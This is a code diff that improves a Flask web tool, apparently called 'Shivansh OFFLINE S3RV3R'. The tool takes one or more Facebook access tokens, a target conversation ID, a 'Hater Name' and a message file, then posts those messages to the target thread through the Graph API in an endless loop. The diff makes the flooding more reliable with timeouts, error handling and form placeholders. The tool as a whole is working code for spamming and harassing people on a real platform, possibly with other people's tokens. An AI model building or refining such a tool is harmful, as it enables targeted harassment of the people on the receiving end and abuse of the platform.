@@ -4,10 +4,11 @@ from threading import Thread, Event
 import time
 import random
 import string
- 
+import os
+
 app = Flask(__name__)
 app.debug = True
- 
+
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -19,10 +20,10 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
- 
+
 stop_events = {}
 threads = {}
- 
+
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -33,13 +34,16 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
+                try:
+                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
+                    if response.status_code == 200:
+                        print(f"Message Sent Successfully From token {access_token}: {message}")
+                    else:
+                        print(f"Message Sent Failed From token {access_token}: {message}")
+                except Exception as e:
+                    print(f"Error sending message: {e}")
                 time.sleep(time_interval)
- 
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
@@ -50,23 +54,23 @@ def send_message():
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
- 
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
- 
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
- 
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
- 
+
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
- 
+
         return f'Task started with ID: {task_id}'
- 
+
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
@@ -77,7 +81,6 @@ def send_message():
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    /* CSS for styling elements */
     label { color: white; }
     .file { height: 30px; }
     body {
@@ -105,7 +108,7 @@ def send_message():
       padding: 7px;
       margin-bottom: 20px;
       border-radius: 10px;
-      color: none;
+      color: white;
     }
     .header { text-align: center; padding-bottom: 20px; }
     .btn-submit { width: 100%; margin-top: 10px; }
@@ -117,6 +120,7 @@ def send_message():
       margin-top: 10px;
     }
     .whatsapp-link i { margin-right: 5px; }
+    .form-control::placeholder { color: #ccc; }
   </style>
 </head>
 <body>
@@ -134,41 +138,41 @@ def send_message():
       </div>
       <div class="mb-3" id="singleTokenInput">
         <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
+        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter Facebook token">
       </div>
       <div class="mb-3" id="tokenFileInput" style="display: none;">
         <label for="tokenFile" class="form-label">Choose Token File</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
       </div>
       <div class="mb-3">
         <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
+        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Enter thread ID" required>
       </div>
       <div class="mb-3">
         <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
+        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Enter name" required>
       </div>
       <div class="mb-3">
         <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
+        <input type="number" class="form-control" id="time" name="time" placeholder="Enter time interval" required>
       </div>
       <div class="mb-3">
         <label for="txtFile" class="form-label">Choose Your Np File</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
     </form>
     <form method="post" action="/stop">
       <div class="mb-3">
         <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
+        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter task ID" required>
       </div>
       <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
     </form>
   </div>
   <footer class="footer">
     <p>Shivansh OFFLINE S3RV3R</p>
-    <p> ALWAYS ON FIRE ðŸ”¥ <a href="">Shivansh</a></p>
+    <p> ALWAYS ON FIRE 🔥 <a href="" style="color: #25d366;">Shivansh</a></p>
     <div class="mb-3">
       <a href="https://wa.me/+919721195240" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i> Chat on WhatsApp
@@ -186,11 +190,15 @@ def send_message():
         document.getElementById('tokenFileInput').style.display = 'block';
       }
     }
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      toggleTokenInput();
+    });
   </script>
 </body>
 </html>
 ''')
- 
+
 @app.route('/stop', methods=['POST'])
 def stop_task():
     task_id = request.form.get('taskId')
@@ -199,6 +207,7 @@ def stop_task():
         return f'Task with ID {task_id} has been stopped.'
     else:
         return f'No task found with ID {task_id}.'
- 
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5040)
+    port = int(os.environ.get('PORT', 5040))
+    app.run(host='0.0.0.0', port=port)
